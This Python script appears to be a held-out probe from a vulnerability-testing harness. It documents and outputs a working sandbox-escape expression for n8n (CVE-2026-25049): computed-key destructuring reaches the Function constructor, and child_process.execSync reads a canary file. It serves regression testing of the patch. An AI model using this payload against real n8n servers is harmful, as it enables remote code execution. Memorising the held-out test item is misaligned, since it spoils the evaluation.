#!/usr/bin/env python3
"""[HELD-OUT] Residual = CVE-2026-25049 (GHSA-6cqr-8cfr-67f8).

Advisory: "Additional exploits in the expression evaluation of n8n have been
identified and patched following CVE-2025-68613." Researcher: "the second is
just a bypass for the initial fix."

The CVE-2025-68613 fix only closed the `this`-binding route (FunctionThisSanitizer
rebinds regular-function `this` to `{process:{}}`). It did NOTHING about reaching
the Function constructor via a DIFFERENT syntax. On V1 (n8n-workflow 1.119.0) the
`PrototypeSanitizer` blocklist is enforced ONLY by `visitMemberExpression` -- it
inspects `.constructor` / `x['constructor']` MEMBER access. Object-DESTRUCTURING
extracts the very same property WITHOUT a MemberExpression node, and V1 has no
`visitObjectPattern` hook, so it is entirely unchecked:

    {{ (()=>{
         const {[`constructor`]: a} = Array;   // Array.constructor  === Function
         const {[`constructor`]: F} = a;        // Function.constructor === Function
         return F("return process.mainModule.require('child_process')"
                  + ".execSync('cat /canary/flag.txt').toString()")()
       })() }}

A `new Function(body)` runs in the GLOBAL scope, where `process` is the REAL Node
process -> child_process.execSync -> reads the planted canary. This escapes on V1
even though the this-binding seed is blocked.

The keys are written as TEMPLATE-LITERAL computed keys ( [`constructor`] ) -- the
exact uncovered branch. The CVE-2026-25049 fix (n8n-workflow 1.120.7, n8n
1.123.17) added `PrototypeSanitizer.visitObjectPattern`, which throws
`ExpressionComputedDestructuringError` ("Computed property names in destructuring
are not allowed") for any computed destructuring key -> BLOCKED on V2. (A plain
identifier key `{constructor: F}` is the sibling form, blocked on V2 by the same
hook via `ExpressionDestructuringError`.)

Benign framing: the escaped command only `cat`s the planted canary file -- no real
payload, no persistence.
"""


def candidate():
    return {
        "probe_id": "residual-cve-2026-25049-templatelit-destructuring-execsync",
        "expr": (
            "{{ (()=>{"
            "const {[`constructor`]: a} = Array;"
            "const {[`constructor`]: F} = a;"
            "return F(\"return process.mainModule.require('child_process')"
            ".execSync('cat /canary/flag.txt').toString()\")()"
            "})() }}"
        ),
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate()))
